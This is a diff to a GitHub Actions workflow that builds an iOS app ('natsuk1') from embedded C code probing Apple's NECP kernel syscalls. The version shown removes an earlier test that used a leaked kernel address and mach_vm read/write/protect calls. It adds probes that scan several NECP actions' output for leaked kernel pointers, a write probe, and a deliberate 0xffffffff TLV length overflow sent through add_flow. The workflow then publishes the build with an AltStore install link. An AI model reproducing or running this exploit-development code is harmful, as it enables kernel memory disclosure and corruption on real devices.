@@ -45,12 +45,8 @@ jobs:
           #include <sys/syscall.h>
           #include <mach/mach.h>
           #include <mach/message.h>
-          #include <mach/vm_region.h>
           #include "nk_api.h"
           #include "nk_offsets.h"
-          extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t*);
-          extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
-          extern kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t);
           #ifndef SYS_NECP_OPEN
           #define SYS_NECP_OPEN 501
           #endif
@@ -82,8 +78,13 @@ jobs:
               uint8_t p[1] = {0};
               return (int)syscall(SYS_NECP_ACTION, fd, 0x01, uuid, (size_t)16, p, (size_t)1);
           }
-          static int nleak_kva(int fd, uint64_t *out) {
-              return (int)syscall(SYS_NECP_ACTION, fd, 0x0D, (void*)0, (size_t)0, (void*)out, (size_t)8);
+          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
+              uint8_t req[56]; memset(req, 0, sizeof(req));
+              memcpy(req + 0x10, cu, 16);
+              *(uint16_t*)(req + 0x20) = 0x0040;
+              int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11, (void*)cu, (size_t)16, req, (size_t)56);
+              if (r == 0) { memcpy(fu, req, 16); fu[9] |= 0x01; }
+              return r;
           }
           static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
               if (len > max) len = max;
@@ -99,134 +100,130 @@ jobs:
               int found = 0;
               for (int i = 0; i + 8 <= len; i += 8) {
                   uint64_t v; memcpy(&v, buf + i, 8);
-                  if (is_kptr(v)) { LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v); found++; if (found >= 24) break; }
+                  if (is_kptr(v)) { LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v); found++; if (found >= 16) break; }
               }
               return found;
           }
-          static kern_return_t rd(mach_vm_address_t a, void *b, size_t n, mach_vm_size_t *o) {
-              return mach_vm_read_overwrite(mach_task_self(), a, n, (mach_vm_address_t)(uintptr_t)b, o);
-          }
-          static kern_return_t wr(mach_vm_address_t a, const void *b, size_t n) {
-              return mach_vm_write(mach_task_self(), a, (vm_offset_t)(uintptr_t)b, (mach_msg_type_number_t)n);
-          }
-          static kern_return_t prot(mach_vm_address_t a, size_t n, vm_prot_t p) {
-              return mach_vm_protect(mach_task_self(), a & ~0xfffULL, n, FALSE, p);
-          }
-          static int step_shared_test(void) {
+          static int step_copy_parameters(void) {
               nk_log("");
-              LI("S1", "shared-mapping test: write via A, read via B");
-              int fdA = nfd();
-              int fdB = nfd();
-              if (fdA < 0 || fdB < 0) { LE("S1", "open errno=%d", errno); return -1; }
-              uint8_t cuA[16]; memset(cuA, 0, sizeof(cuA));
-              uint8_t cuB[16]; memset(cuB, 0, sizeof(cuB));
-              if (nadd_client(fdA, cuA) != 0) { close(fdA); close(fdB); return -1; }
-              if (nadd_client(fdB, cuB) != 0) { close(fdA); close(fdB); return -1; }
-              uint64_t uvaA = 0, uvaB = 0;
-              nleak_kva(fdA, &uvaA);
-              nleak_kva(fdB, &uvaB);
-              LI("S1", "uvaA=0x%llx uvaB=0x%llx same=%d",
-                 (unsigned long long)uvaA, (unsigned long long)uvaB,
-                 uvaA == uvaB ? 1 : 0);
-
-              uint8_t snapA[512]; memset(snapA, 0, sizeof(snapA));
-              mach_vm_size_t got = 0;
-              kern_return_t kr = rd((mach_vm_address_t)uvaA, snapA, sizeof(snapA), &got);
-              LI("S1", "snapshot via A kr=%d got=%llu", kr, (unsigned long long)got);
-              LI("S1", "before (A):");
-              hexdump("S1B", snapA, 512, 512);
-
-              kr = prot((mach_vm_address_t)uvaA, 0x4000,
-                        VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
-              LI("S1", "vm_protect(RW_COPY) on A kr=%d", kr);
-              kr = prot((mach_vm_address_t)uvaA, 0x4000,
-                        VM_PROT_READ | VM_PROT_WRITE);
-              LI("S1", "vm_protect(RW) on A kr=%d", kr);
-
-              uint64_t marker = 0xcafebabedeadbeefULL;
-              kr = wr((mach_vm_address_t)(uvaA + 0x100), &marker, 8);
-              LI("S1", "write marker via A kr=%d", kr);
-
-              uint8_t snapA2[512]; memset(snapA2, 0, sizeof(snapA2));
-              kr = rd((mach_vm_address_t)uvaA, snapA2, sizeof(snapA2), &got);
-              LI("S1", "re-read via A kr=%d", kr);
-              uint64_t checkA = 0;
-              memcpy(&checkA, snapA2 + 0x100, 8);
-              LI("S1", "A sees at +0x100: 0x%llx", (unsigned long long)checkA);
-
-              uint8_t snapB[512]; memset(snapB, 0, sizeof(snapB));
-              kr = rd((mach_vm_address_t)uvaB, snapB, sizeof(snapB), &got);
-              LI("S1", "read via B kr=%d", kr);
-              uint64_t checkB = 0;
-              memcpy(&checkB, snapB + 0x100, 8);
-              LI("S1", "B sees at +0x100: 0x%llx", (unsigned long long)checkB);
-
-              if (checkA == marker && checkB == marker) {
-                  LO("S1", "SHARED MAPPING CONFIRMED - kernel sees our writes!");
-              } else if (checkA == marker) {
-                  LW("S1", "COW copy - A sees marker, B does not (kernel does not)");
-              } else {
-                  LW("S1", "write did not stick");
+              LI("S1", "op=0x0C copy_parameters");
+              int fd = nfd();
+              if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+              uint8_t buf[256]; memset(buf, 0, sizeof(buf));
+              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x0C,
+                                   (void*)cu, (size_t)16, buf, (size_t)0x18);
+              LI("S1", "ret=%d", c);
+              close(fd);
+              if (c > 0) {
+                  hexdump("S1H", buf, c, 0x18);
+                  int nk = scan_kptr("S1K", buf, c);
+                  LI("S1", "kptr count = %d", nk);
               }
-
-              close(fdA);
-              close(fdB);
-              return 0;
+              return c;
           }
-          static int step_arena_dump(void) {
+          static int step_get_signed_id(void) {
               nk_log("");
-              LI("S2", "full arena dump via mach_vm_read");
+              LI("S2", "op=0x18 get_signed_client_id");
               int fd = nfd();
               if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              uint64_t uva = 0;
-              nleak_kva(fd, &uva);
+              uint32_t one = 1;
+              uint8_t buf[0x40]; memset(buf, 0, sizeof(buf));
+              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x18,
+                                   (void*)&one, (size_t)4, buf, (size_t)0x34);
+              LI("S2", "ret=%d", c);
               close(fd);
-              LI("S2", "uva=0x%llx", (unsigned long long)uva);
-
-              uint8_t big[512]; memset(big, 0, sizeof(big));
-              mach_vm_size_t got = 0;
-              kern_return_t kr = rd((mach_vm_address_t)uva, big, sizeof(big), &got);
-              LI("S2", "kr=%d got=%llu", kr, (unsigned long long)got);
-              hexdump("S2H", big, 512, 512);
-              return 0;
+              if (c > 0) {
+                  hexdump("S2H", buf, c, 0x34);
+                  int nk = scan_kptr("S2K", buf, c);
+                  LI("S2", "kptr count = %d", nk);
+              }
+              return c;
           }
-          static int step_copy_interface(void) {
+          static int step_set_signed_id(void) {
               nk_log("");
-              LI("S3", "op=0x09 copy_interface idx 1..5 with hexdump");
+              LI("S3", "op=0x19 set_signed_client_id (write probe)");
               int fd = nfd();
               if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
+              uint32_t one = 1;
+              uint8_t buf[0x34]; memset(buf, 0, sizeof(buf));
+              *(uint32_t*)(buf + 0) = 0xdeadbeef;
+              *(uint32_t*)(buf + 4) = 0xcafebabe;
+              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x19,
+                                   (void*)&one, (size_t)4, buf, (size_t)0x34);
+              LI("S3", "ret=%d", c);
+              close(fd);
+              return c;
+          }
+          static int step_route_stats(void) {
+              nk_log("");
+              LI("S4", "op=0x0B route stats (full 0x48)");
+              int fd = nfd();
+              if (fd < 0) { LE("S4", "open errno=%d", errno); return -1; }
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              for (uint32_t idx = 1; idx <= 5; idx++) {
-                  uint8_t ibuf[4]; memcpy(ibuf, &idx, 4);
-                  uint8_t buf[256]; memset(buf, 0, sizeof(buf));
-                  int c = (int)syscall(SYS_NECP_ACTION, fd, 0x09,
-                                       (void*)ibuf, (size_t)4, buf, (size_t)0x74);
-                  LI("S3", "idx=%u ret=%d", idx, c);
+              uint8_t buf[0x48]; memset(buf, 0, sizeof(buf));
+              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x0B,
+                                   (void*)cu, (size_t)16, buf, (size_t)0x48);
+              LI("S4", "ret=%d", c);
+              close(fd);
+              if (c > 0) {
+                  hexdump("S4H", buf, c, 0x48);
+                  int nk = scan_kptr("S4K", buf, c);
+                  LI("S4", "kptr count = %d", nk);
+              }
+              return c;
+          }
+          static int step_tlv_overflow(void) {
+              nk_log("");
+              LI("S5", "TLV overflow test - send bad TLV len in add_flow");
+              int fd = nfd();
+              if (fd < 0) { LE("S5", "open errno=%d", errno); return -1; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+
+              uint8_t req[256];
+              memset(req, 0, sizeof(req));
+              memcpy(req + 0x10, cu, 16);
+              *(uint16_t*)(req + 0x20) = 0x0040;
+
+              req[0x24] = 0x01;
+              *(uint32_t*)(req + 0x25) = 0xffffffff;
+
+              uint8_t fu[16];
+              int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11,
+                                   (void*)cu, (size_t)16, req, (size_t)0x100);
+              LI("S5", "add_flow with 0xffffffff TLV len ret=%d", r);
+              if (r == 0) {
+                  uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
+                  int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
+                                       (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
+                  LI("S5", "copy_result after bad TLV: ret=%d", c);
                   if (c > 0) {
-                      hexdump("S3H", buf, c, 0x74);
-                      int nk = scan_kptr("S3K", buf, c);
-                      LI("S3", "  kptr count = %d", nk);
+                      hexdump("S5H", buf, c, 512);
+                      int nk = scan_kptr("S5K", buf, c);
+                      LI("S5", "kptr count = %d", nk);
                   }
               }
               close(fd);
-              return 0;
+              return r;
           }
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v5.1 - NECP arena shared-write test");
+              nk_log("natsuk1 v5.2 - NECP final probes");
               nk_log("================================================================");
               nk_log("");
               int fd = nfd();
               if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
               close(fd);
               LO("PRE", "necp_open OK");
-              step_arena_dump();
-              step_shared_test();
-              step_copy_interface();
+              step_copy_parameters();
+              step_get_signed_id();
+              step_set_signed_id();
+              step_route_stats();
+              step_tlv_overflow();
               nk_log("");
               nk_log("======== done ========");
               return 0;
@@ -280,7 +277,7 @@ jobs:
           fi
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v5.1
+          NOTES="natsuk1 v5.2
 
           IPA: ${IPA_URL}
           AltStore: altstore://install?url=${IPA_URL}
